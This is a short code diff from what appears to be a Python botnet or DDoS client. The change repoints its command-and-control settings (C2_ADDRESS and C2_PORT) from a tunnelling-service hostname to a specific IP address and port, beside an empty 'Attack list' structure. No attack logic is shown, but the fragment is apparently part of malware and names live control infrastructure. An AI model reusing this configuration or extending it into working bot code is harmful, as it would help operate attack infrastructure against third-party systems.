@@ -1,8 +1,8 @@
 import subprocess, random, os, time, threading, socket
 
 # Configuration
-C2_ADDRESS  = "put-not.gl.at.ply.gg"
-C2_PORT     = 35877
+C2_ADDRESS  = "147.185.221.16"
+C2_PORT     = 33757
 
 # Attack list
 user_attacks = {}
